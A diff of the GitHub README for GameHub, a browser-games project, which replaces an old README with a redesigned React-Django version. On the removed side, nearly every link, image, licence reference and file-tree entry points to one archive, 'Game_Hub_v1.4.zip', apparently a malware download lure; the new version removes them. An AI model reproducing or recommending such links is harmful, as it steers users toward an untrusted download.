@@ -1,341 +1,193 @@
-## Rules For ECWoC26
-- It is important to star the repo , otherwise your  contribution will not count.
-- You need to make a proper docs for the feature you are trying to implement and share it with me using docs in mail.
-- Only the meaningful issue which are important will only be considered , other will be close.
-- More priority will be given to the contributors who have lower rank in leaderboard.
-***
+<a name="-top"></a>
 
-## 🧭 Table of Contents
+<div align="center">
+  <img src="frontend/public/assets/new_logo.png" width="80" alt="GameHub Logo">
+  <h1>GameHub: Cosmic Edition</h1>
+  
+  <p align="center">
+    <b>Experience the next generation of browser gaming. High-performance, low-latency, and stunning cosmic aesthetics.</b>
+  </p>
 
+  <p align="center">
+    <img src="https://img.shields.io/github/stars/kaifansariw/GameHub?style=for-the-badge&color=7c3aed&labelColor=050508" alt="Stars">
+    <img src="https://img.shields.io/github/forks/kaifansariw/GameHub?style=for-the-badge&color=ec4899&labelColor=050508" alt="Forks">
+    <img src="https://img.shields.io/github/license/kaifansariw/GameHub?style=for-the-badge&color=7c3aed&labelColor=050508" alt="License">
+    <img src="https://img.shields.io/github/issues/kaifansariw/GameHub?style=for-the-badge&color=ec4899&labelColor=050508" alt="Issues">
+  </p>
+
+  <p align="center">
+    <a href="https://gamehub-cosmic.vercel.app">
+      <img src="https://img.shields.io/badge/Live%20Demo-Deploy%20Sync-7c3aed?style=for-the-badge&logo=rocket&logoColor=white" alt="Live Demo">
+    </a>
+  </p>
+
+  <p align="center">
+    <a href="#-about-gamehub">About</a> •
+    <a href="DOCS.md">Technical Docs</a> •
+    <a href="#-quick-start">Quick Start</a> •
+    <a href="#🌟-contributing">Contribute</a> •
+    <a href="https://github.com/kaifansariw/GameHub/issues">Request Feature</a>
+  </p>
+</div>
+
+---
+
+<p align="center">
+  <img src="frontend/public/homepage.png" width="900" alt="GameHub Cosmic Edition Screenshot" style="border-radius: 20px; border: 2px solid #7c3aed33;">
+  <br>
+  <i>The Cosmic Neon Library Interface</i>
+</p>
+
+---
+
+### 🛡️ Protocol Guidelines (ECWoC26)
+> [!IMPORTANT]
+> *   **Star the Repo**: Your contribution only counts if you've starred the repository. ⭐
+> *   **Documentation**: Proper docs are required for every new feature. Share them via mail.
+> *   **Meaningful Issues**: Only high-impact issues will be considered.
+> *   **Leaderboard Priority**: Priority is given to contributors with lower ranks.
+
+---
+
+## 🗺️ Table of Contents
 - [💡 About GameHub](#-about-gamehub)
-- [🚀 Demo](#-demo)
 - [✨ Features](#-features)
-- [🎮 Games](#-games)
-- [🛠️ Tech Stack](#️-tech-stack)
-- [💡 Prerequisites](#-prerequisites)
-- [🚀 Quick Start](#-quick-start)
+- [🛠️ Tech Stack](#-tech-stack)
 - [📁 Project Structure](#-project-structure)
-- [📸 Screenshots](#-screenshots)
-- [🔧 Adding New Games](#-adding-new-games)
+- [🚀 Quick Start](#-quick-start)
+- [🎮 Adding New Games](#-adding-new-games)
 - [🌟 Contributing](#-contributing)
-- [📱 Browser Support](#-browser-support)
-- [📄 License](#-license)
-- [🙏 Acknowledgments](#-acknowledgments)
 - [✨ Contributors](#-contributors)
+- [📄 License](#-license)
 
-
-***
+---
 
 ## 💡 About GameHub
+**GameHub** is an elite, open-source collection of classic and modern browser games. Re-imagined with a **Cosmic Blue Neon** aesthetic, it combines the nostalgia of retro gaming with the performance of industry-standard web tech.
 
-**GameHub** is a free, open-source collection of classic browser games designed to bring nostalgia, fun, and learning together in one place. Built with modern web technologies and a focus on simplicity, GameHub offers smooth gameplay, responsive design, and clean code that makes it easy for developers to explore, learn, and contribute.
+Originally a Vanilla JS project, GameHub has been upgraded to a **React-Django Hybrid** architecture to support massive scalability, premium animations, and a global leaderboard system.
 
-### 🎯 Our Mission
-
-- **Nostalgia Meets Modern Web**: Recreate beloved classic games using cutting-edge web technologies
-- **Learn by Playing**: Provide a codebase that's educational, well-documented, and beginner-friendly
-- **Open Source First**: Foster a welcoming community where developers can contribute and grow
-- **Performance & Accessibility**: Deliver fast, lightweight experiences that work seamlessly across all devices
-
-### 🌟 Why GameHub?
-
-In an era of complex game engines and heavy frameworks, GameHub proves that amazing gaming experiences can be built with vanilla JavaScript, thoughtful design, and attention to performance. Whether you're a student learning web development, a developer looking to contribute to open source, or simply someone who loves classic games, GameHub welcomes you.
-
-### 🚀 Future Vision
-
-- Expand the game library with community contributions
-- Add multiplayer capabilities for real-time competition
-- Implement achievement systems and global leaderboards
-- Create educational tutorials for each game's implementation
-- Build a thriving community of game developers and enthusiasts
-
-
-***
-
-## 🚀 Demo
-
-- **[Play Now]()**
-***
+---
 
 ## ✨ Features
 
-- 5 Classic Games: Tic Tac Toe, Snake, Simon Says, Memory Flip, Rock Paper Scissors
-- Fully Responsive: Optimized for desktop, tablet, and mobile
-- Modern Glassmorphism UI: Built using Tailwind CSS and DaisyUI 
-- Fast & Lightweight: Pure vanilla JS, zero frameworks
-- Score Persistence: Progress saved in LocalStorage
-- Real-time Search: Instantly filter and find games
-- Smooth Animations
-***
+<div align="left">
 
-## 🎮 Games
+| Feature | Description |
+| :--- | :--- |
+| 🚀 **Modern Engine** | Built with **React 19** for sub-millisecond responsiveness. |
+| 🎨 **Cosmic UI** | High-end Glassmorphism and Neon design system. |
+| 🕹️ **50+ Titles** | Instant play library including Retro classics. |
+| 🏆 **Leaderboards** | Global competition powered by a Django REST backend. |
+| 📱 **Responsive** | Perfect parity between Desktop, Tablet, and Mobile. |
+| 🛠️ **Modular code** | Clean architecture designed for easy open-source entry. |
 
-| Game                     | Description                              | Features                                         |
-|--------------------------|------------------------------------------|--------------------------------------------------|
-| **Rock Paper Scissors**  | Classic hand game                        | Win/loss stats, animations                       |
-| **2048 Game**            | Tile sliding number puzzle               | Score tracking, smooth animations                |
-| **Sudoku Puzzle**        | Number placement puzzle                  | Multiple difficulties, hints                     |
-| **Minesweeper**          | Mine avoidance logic game                | Flagging cells, timer                            |
-| **Breakout**             | Brick-breaking arcade game               | Paddle control, increasing difficulty            |
-| **Balloon Popper**       | Pop balloons before time runs out        | Timer-based gameplay, score system               |
-| **Boom Runner**          | Dodge bombs and survive                  | Reflex-based controls, speed increase            |
-| **Brick Breaker**        | Break bricks using a paddle              | Power-ups, levels                                |
-| **Bubble Shooter**       | Match and pop colored bubbles            | Aim mechanics, combo scoring                     |
-| **Candy Match Mania**    | Match candies to score points            | Chain reactions, colorful UI                     |
-| **Code Unlock**          | Crack codes using logic                  | Pattern recognition, increasing difficulty       |
-| **Color Grid**           | Color-matching puzzle                    | Visual logic, timed challenges                   |
-| **Dodge Square**         | Avoid obstacles and survive              | Fast-paced movement, reflex testing              |
-| **Firefly Flow**         | Guide fireflies through patterns         | Precision control, calming visuals               |
-| **Flappy Block**         | Navigate obstacles by flapping           | Score tracking, increasing difficulty            |
-| **Freeze Frame**         | Stop motion at the right moment          | Timing-based gameplay                            |
-| **Fruit Slice**          | Slice fruits with precision              | Swipe controls, combo points                     |
-| **Glow Chain**           | Trigger glowing chain reactions          | Visual effects, chain mechanics                  |
-| **Glow Drops**           | Tap glowing drops before disappearing    | Speed-based taps, score counter                  |
-| **Glow Tap**             | Tap glowing circles in time              | Timing accuracy, reflex training                 |
-| **Gravity Flip Ball**    | Flip gravity to move the ball            | Physics-based gameplay, level progression        |
-| **Hangman Hero**         | Guess the hidden words                   | Vocabulary building, hint system                 |
-| **Jump Counter**         | Jump to increase your score              | Score tracking, timing precision                 |
-| **Jump Tag**             | Tag targets by jumping                   | Movement accuracy, reflex-based                  |
-| **Logic Path**           | Guide the ball using logic               | Puzzle-solving, progressive levels               |
-| **Memory Blink**         | Remember blinking patterns               | Memory training, increasing speed                |
-| **Pattern Memory**       | Remember and repeat patterns             | Sequence memory, difficulty scaling              |
-| **Pipe Twister**         | Rotate pipes to connect flows            | Logic rotation puzzles                           |
-| **Reaction Speed Test**  | Test your reaction speed                 | Tap-time measurement, instant feedback           |
-| **Sand Draw**            | Draw freely in virtual sand              | Relaxing UI, creative drawing                    |
-| **Sliding Puzzle**       | Slide blocks to complete image           | Logical movement, image puzzles                  |
-| **Speed Tap Grid**       | Tap targets quickly on a grid            | Reflex speed, time challenge                     |
-| **Symbol Swap**          | Swap symbols to match rows               | Pattern logic, strategic thinking                |
-| **Tap Counter**          | Tap repeatedly to score                  | Speed tracking, real-time counter                |
-| **Tetris**               | Classic falling block puzzle             | Line clearing, increasing speed                  |
-| **Tower of Hanoi**       | Solve disk puzzle in minimum moves       | Algorithmic thinking, step counter               |
-| **Typing Sprint**        | Type words quickly to score              | Speed tracking, accuracy scoring                 |
-| **Vortex Jump**          | Jump through twisting vortex paths       | Precision jumps, reaction timing                 |
-| **Word Chain**           | Form chains of related words             | Vocabulary skills, word logic                    |
-| **Word Scramble**        | Unscramble letters to form words         | Time-based challenges, hints                     |
-| **Typing Speed Test**    | Measure typing speed and accuracy        | WPM tracking, clean UI                           |
+</div>
 
-
-***
+---
 
 ## 🛠️ Tech Stack
 
-- **Frontend:** HTML5, CSS3, JavaScript
-- **Styling:** Tailwind CSS, DaisyUI
-- **Animations:**
-- **Icons:** Font Awesome
-- **Storage:** LocalStorage API
+| Tier | Technology | Icon |
+| :--- | :--- | :---: |
+| **Frontend** | React 19, Framer Motion | <img src="https://img.icons8.com/color/24/000000/react-native.png"/> |
+| **Styling** | Tailwind CSS 4, Lucide Icons | <img src="https://img.icons8.com/color/24/000000/tailwindcss.png"/> |
+| **Backend** | Django REST Framework | <img src="https://img.icons8.com/color/24/000000/django.png"/> |
+| **State** | Zustand Global Store | 🐻 |
+| **Build Tool** | Vite (Ultra-fast HMR) | <img src="https://img.icons8.com/color/24/000000/vite.png"/> |
 
-***
+---
 
-## 💡 Prerequisites
+## 📁 Project Structure
+```text
+GameHub/
+├── frontend/                # React Application (Vite)
+│   ├── src/
+│   │   ├── components/      # UI Elements & Layouts
+│   │   ├── pages/           # High-Fidelity Views
+│   │   ├── data/            # Game Registries (games.js)
+│   │   └── store/           # Zustand Logic
+│   └── public/              # Assets & Static Games
+│
+├── backend/                 # Django REST API
+│   ├── accounts/            # Auth & Leaderboards
+│   └── gamehub_project/     # Core Settings
+│
+├── DOCS.md                  # Technical Deep-Dive
+└── README.md                # Project Overview
+```
 
-- Modern web browser: Chrome, Firefox, Safari, or Edge
-
-***
+---
 
 ## 🚀 Quick Start
 
-Follow these steps to run the GameHub Django project locally:
-
-**1️⃣ Clone the Repository**
-
+### 1️⃣ Clone the Repo
 ```bash
-git clone <YOUR_FORK_URL>
-cd <DIRECTORY_NAME>
+git clone https://github.com/kaifansariw/GameHub.git
 ```
 
-**2️⃣ Install Django**
-
+### 2️⃣ Initialize Frontend
 ```bash
-pip install django
+cd frontend
+npm install
+npm run dev
 ```
 
-**3️⃣ Navigate to the Project Folder**
+### 3️⃣ Initialize Backend
 ```bash
-cd gamehub_project
+cd backend
+python -m venv venv
+# Win: .\venv\Scripts\activate | Mac/Linux: source venv/bin/activate
+pip install -r requirements.txt
+python manage.py runserver
 ```
 
-**4️⃣ Run the Development Server**
+---
 
-```bash
-python 
-```
+## 🎮 Adding New Games
+Registering a new title in the Cosmic Library:
 
-**5️⃣ Open in Browser**
-
-Visit:
-
-```
-http://127.0.0.1:8000/
-```
-
-Your GameHub website will now be live locally 🎮🚀
-
-***
-
-## 📁 Project Structure
-
-```
-GameHub/
-├── gamehub_project/
-│   ├── accounts/                   # Authentication app
-│   │   ├── migrations/
-│   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │   └── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │
-│   ├── gamehub_project/            # Core Django settings
-│   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │   └── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │
-│   ├── static/                     # Static files (CSS, JS, Images)
-│   │   ├── assets/                 # Game thumbnails & icons
-│   │   ├── games/                  # HTML files for games
-│   │   ├── scripts/                # All game logic JS files
-│   │   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │   │   └── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │   └── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│   │
-│   ├── staticfiles/                # Auto-generated (ignored in git)
-│   │
-│   ├── templates/                  # Django HTML templates
-│   │   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip              # Homepage
-│   │   └── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip              # Authentication page
-│   │
-│   ├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip                  # Local database
-│   └── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-│
-├── .gitignore
-├── LICENSE
-├── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-└── https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip
-```
-
-***
-
-## 📸 Screenshots
-
-<details>
-  <summary>Homepage</summary>
-  <img width="1920" height="872" alt="image" src="https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip" />
-</details>
-
-<details>
-  <summary>Games Collection</summary>
-  <img width="1331" height="870" alt="image" src="https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip" />
-</details>
-
-***
-
-## 🔧 Adding New Games
-
-1. Add a new HTML file in `static/games/`
-2. Write the game's JS in `static/scripts/`
-3. Register your game in the games array in `https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip`:
-
+1. **Upload Assets**: Folder at `frontend/public/games/<game-id>/`.
+2. **Register Metadata**: Edit `frontend/src/data/games.js`:
 ```javascript
 {
-    id: 'your-game',
-    title: 'Your Game',
-    description: 'Game description',
-    image: 'path/to/image',
-    file: 'https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip',
-    category: 'arcade'
+    id: "quantum-racer",
+    title: "Quantum Racer",
+    description: "Multi-dimensional racing experience.",
+    image: "/assets/thumbs/quantum.png",
+    file: "/games/quantum/index.html",
+    category: "racing"
 }
 ```
 
-***
+---
 
 ## 🌟 Contributing
+We ❤️ our contributors! Whether it's a bug fix or UI polish:
 
-We welcome contributions from developers of all skill levels! Whether you're fixing bugs, adding new games, improving documentation, or suggesting features, your input is valuable.
+1. **Fork** → **Branch** (`git checkout -b feat/CoolFeature`) → **Commit** → **Push** → **PR**.
 
-### How to Contribute
-
-- Fork the repository
-- Create a new branch: `git checkout -b feature/YourFeature`
-- Commit & push:  
-  ```bash
-  git commit -m "Add: YourFeature"
-  git push origin feature/YourFeature
-  ```
-- Open a Pull Request
-
-Check out our [Contributing Guidelines](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip) for more details!
-
-***
-
-## 📱 Browser Support
-
-| Browser  | Supported |
-|----------|:---------:|
-| Chrome   | ✅        |
-| Firefox  | ✅        |
-| Safari   | ✅        |
-| Edge     | ✅        |
-| Mobile   | ✅        |
-
-***
-
-## 📄 License
-
-Licensed under the [MIT License](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip).
-
-***
-
-## 🙏 Acknowledgments
-
-- [Tailwind CSS](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
-- [DaisyUI](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
-- [https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
-- [Font Awesome](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
-
-***
+---
 
 ## ✨ Contributors
+The heroes behind the Cosmic Engine:
 
-Thanks to all the wonderful contributors 💖
-
-<a href="https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip">
-  <img src="https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip" />
+<a href="https://github.com/kaifansariw/GameHub/graphs/contributors">
+  <img src="https://contrib.rocks/image?repo=kaifansariw/GameHub&max=100&columns=10" />
 </a>
 
-See full list of contributor contributions: [Contribution Graph](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
+---
 
-***
- 
+## 📄 License
+This project is licensed under the **MIT License**.
 
-
-<div align="center">
-
-<div align="center">
-
-
-
+---
 
 <div align="center">
+  <p>Maintained by <b>Kaif Ansari</b> & the Open Source Community</p>
+</div>
 
-
-
-[⭐ Star this repo](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip) • 
-[🐛 Report Bug](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip) • 
-[✨ Request Feature](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
-
-Made with ❤️ by [Kaif Ansari](https://raw.githubusercontent.com/kaifansariw/GameHub/main/gamehub_project/accounts/Game_Hub_v1.4.zip)
-
+---
+<div align="center">
+<a href="#-top">Back to Top ↑</a>
 </div>
